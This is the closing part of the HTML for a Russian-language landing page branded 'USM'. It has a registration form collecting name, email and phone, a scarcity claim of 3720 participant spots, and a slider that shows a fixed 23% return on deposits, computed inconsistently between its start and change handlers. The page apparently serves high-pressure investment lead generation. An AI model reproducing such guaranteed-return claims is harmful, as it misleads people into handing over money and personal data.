81.5853V86.1168H45.3813V81.9134C45.3813 81.0601 45.1183 80.6656 44.3308 80.6656C43.7398 80.6656 43.083 80.9286 42.4914 81.5853V86.1168H41.7031V77.7106ZM52.8678 84.8027C52.3419 85.7224 51.5543 86.1826 50.4381 86.1826C48.8616 86.1826 47.9426 85.132 47.9426 83.0296C47.9426 81.0594 48.9273 79.9431 50.3723 79.9431C51.8173 79.9431 52.737 80.9937 52.737 82.9652V83.2275H48.8623V83.4248C48.8623 84.7389 49.519 85.4607 50.5045 85.4607C51.227 85.4607 51.8837 85.1327 52.2124 84.4102L52.8678 84.8027ZM51.8173 82.5044C51.8173 81.323 51.2263 80.665 50.3723 80.665C49.4526 80.665 48.9273 81.3224 48.8616 82.5044H51.8173ZM58.582 77.7106H60.8803C63.0477 77.7106 64.0983 78.3009 64.0983 79.8116C64.0983 80.7314 63.6388 81.3224 62.719 81.6511C63.7045 82.0455 64.3612 82.768 64.3612 83.8185C64.3612 85.3279 63.2443 86.1168 61.1426 86.1168H58.5813V77.7106H58.582ZM59.501 78.4331V81.323H61.2747C62.5225 81.323 63.1792 80.7964 63.1792 79.8123C63.1792 78.8926 62.4567 78.4337 61.0118 78.4337H59.501V78.4331ZM59.501 82.1099V85.3279H61.209C62.719 85.3279 63.3765 84.8691 63.3765 83.7521C63.3765 82.6352 62.654 82.1099 61.209 82.1099H59.501ZM66.8568 77.8421H67.7765V78.8926H66.8568V77.8421ZM68.6955 77.8421H69.6152V78.8926H68.6955V77.8421ZM68.2367 79.9431C69.8124 79.9431 70.7979 81.0601 70.7979 83.0296C70.7979 85.0656 69.8124 86.1826 68.2367 86.1826C66.6595 86.1826 65.6754 85.0656 65.6754 83.0296C65.6747 81.0594 66.6595 79.9431 68.2367 79.9431ZM68.2367 85.5252C69.2872 85.5252 69.8789 84.6719 69.8789 83.0961C69.8789 81.4539 69.2872 80.6656 68.2367 80.6656C67.1861 80.6656 66.5945 81.4545 66.5945 83.0303C66.5945 84.6719 67.1861 85.5252 68.2367 85.5252ZM72.5052 80.0089H73.3598V81.3874C73.8187 80.4033 74.3439 79.9425 75.1328 79.9425H75.3301V80.7958H75.2636C74.4103 80.7958 73.7529 81.4532 73.3598 82.7009V86.1162H72.5052V80.0089ZM76.6422 84.541C77.1024 85.1971 77.6927 85.5252 78.3502 85.5252C79.1391 85.5252 79.5979 85.0663 79.5979 84.4746C79.5979 83.6871 78.9418 83.6213 77.7585 83.2269C76.708 82.9646 76.1827 82.3736 76.1827 81.5847C76.1827 80.6005 76.9703 79.9425 78.0221 79.9425C78.9418 79.9425 79.6643 80.2705 80.1896 80.9279L79.6643 81.5196C79.2041 80.9279 78.6789 80.5999 78.0872 80.5999C77.4311 80.5999 77.0367 80.993 77.0367 81.5196C77.0367 81.7819 77.1675 81.9785 77.3647 82.1099C77.7592 82.438 78.3502 82.5044 78.9418 82.7016C79.9924 83.0296 80.4512 83.5549 80.4512 84.4095C80.4512 85.4601 79.5979 86.1826 78.2838 86.1826C77.2996 86.1826 76.4443 85.7881 75.9855 85.0656L76.6422 84.541ZM86.5605 84.8027C86.0352 85.7224 85.2463 86.1826 84.1301 86.1826C82.5543 86.1826 81.6346 85.132 81.6346 83.0296C81.6346 81.0594 82.6187 79.9431 84.0637 79.9431C85.5086 79.9431 86.4284 80.9937 86.4284 82.9652V83.2275H82.5543V83.4248C82.5543 84.7389 83.2104 85.4607 84.1965 85.4607C84.919 85.4607 85.575 85.1327 85.9031 84.4102L86.5605 84.8027ZM85.5086 82.5044C85.5086 81.323 84.9183 80.665 84.0637 80.665C83.144 80.665 82.6187 81.3224 82.5543 82.5044H85.5086Z"
                fill="currentColor"
              ></path>
              <path
                fill-rule="evenodd"
                clip-rule="evenodd"
                d="M17.9287 59.3867L5.64709 66.348V73.8352L24.4962 63.0642L17.9287 59.3867Z"
                fill="currentColor"
              ></path>
              <path
                fill-rule="evenodd"
                clip-rule="evenodd"
                d="M37.6312 62.0144L32.0485 58.7964H18.9136L31.0637 65.6926L37.6312 62.0144Z"
                fill="currentColor"
              ></path>
              <path
                fill-rule="evenodd"
                clip-rule="evenodd"
                d="M57.465 51.7681L32.0485 66.2829H45.2498L63.9017 55.5777L57.465 51.7681Z"
                fill="currentColor"
              ></path>
              <path
                fill-rule="evenodd"
                clip-rule="evenodd"
                d="M77.1675 54.4607L71.4546 51.2427H58.3848L70.5349 58.2703L77.1675 54.4607Z"
                fill="currentColor"
              ></path>
              <path
                fill-rule="evenodd"
                clip-rule="evenodd"
                d="M122.353 37.254L84.6547 58.7958H71.5204L122.353 29.8325V37.254Z"
                fill="currentColor"
              ></path>
            </svg>
          </div>
        </div>
      </section>
    </main>

    <div class="pt-8 pb-8 bg-primary">
      <section class="container mx-auto flex justify-center pb-12 pt-12">
        <div class="custom flex flex-col items-center bg-white md:w-4/5 sm:w-full block20">
          <div class="w-auto text-center flex justify-center">
            <img style="max-width: 80px" src="assets/usm.png" alt="logo" />
          </div>

          <h3
            class="text-2xl text-center font-bold font-ubuntu mt-5 mb-6 sm:mb-10"
            style="color: #00223a"
          >
            Программа рассчитана на 3720 участников, не упускай момент
          </h3>

          <form
            class="form-container"
            id="formBottom"
            method="post"
            autocomplete="off"
            style="width: 100%"
          >
            <div class="form_group--name">
              <input name="first_name" id="first_name" placeholder="Введите имя" required />
            </div>
            <div class="form_group--name">
              <input placeholder="Введите фамилию" name="last_name" id="last_name" required />
            </div>
            <div class="form_group--email">
              <input type="email" name="email" id="email" placeholder="Email" required />
            </div>
            <div class="form_input--group">
              <input type="tel" class="phone-3" name="phone2" id="phone2" required />
            </div>
            <div class="form_group--button">
              <button class="send-form btn btn-primary btn_send form-button-send" type="submit">
                <span class="button--inner">Подать заявку</span>
              </button>
            </div>
          </form>
        </div>
      </section>
    </div>

    <footer>
      <div class="container mx-auto py-4 text-center sm:leading-relaxed opacity-50 sm:text-xs">
        © USM 2022
      </div>
    </footer>

    <!-- Start popup double -->
    <div class="modal-form" id="modalFailure">
      <p class="close-modal" href="#">&times;</p>
      <div class="content">
        <div class="sign-up-form-header text-center mb-4">
          <h5 class="mb-2 mt-4">
            Вы уже зарегистрировались на данный номер. Если вам нужен новый аккаунт, пройдите
            регистрацию на другой мобильный номер
          </h5>
        </div>
      </div>
    </div>

    <div class="modal-form" id="modalFailureEmail">
      <p class="close-modal" href="#">&times;</p>
      <div class="content">
        <div class="sign-up-form-header text-center mb-4">
          <h5 class="mb-2 mt-4">
            Вы уже зарегистрировались на данную электронную почту. Если вам нужен новый аккаунт,
            пройдите регистрацию на другую электронную почту.
          </h5>
        </div>
      </div>
    </div>

    <div class="modal-form" id="modalInvalid">
      <p class="close-modal" href="#">&times;</p>
      <div class="content">
        <div class="sign-up-form-header text-center mb-4">
          <h5 class="mb-2 mt-4">
            Вы ввели неккоректную электронную почту. Пройдите регистрацию на другую электронную
            почту.
          </h5>
        </div>
      </div>
    </div>
    <!-- End popup double -->

    <script>
      $('.scrl-top').on('click', function (e) {
        document.querySelector('#registration').scrollIntoView({ behavior: 'smooth' });
      });
    </script>
    <script>
      $(function () {
        $('.js-range-slider').ionRangeSlider({
          skin: 'round',
          min: 150,
          max: 100000,
          from: 150,
          max_postfix: '+',
          postfix: '$',
          grid: true,
          onStart: function (data) {
            $('#calcResult').text(Math.round(data.from * 1.23 + data.from) + '$');
          },
          onChange: function (data) {
            $('#calcResult').text(Math.round(data.from * 0.23 + data.from) + '$');
          },
        });
      });
    </script>
    <script src="js/checkCookiePhone.js"></script>
    <script src="js/jquery.validate.js"></script>
    <script src="js/intlTelInput.min.js"></script>
    <script src="js/jquery.maskedinput.js"></script>
    <script src="js/modal.js"></script>
    <script src="js/main.js"></script>
    <script src="js/submitForm.js"></script>
    <script src="js/utm.js"></script>
  </body>
</html>
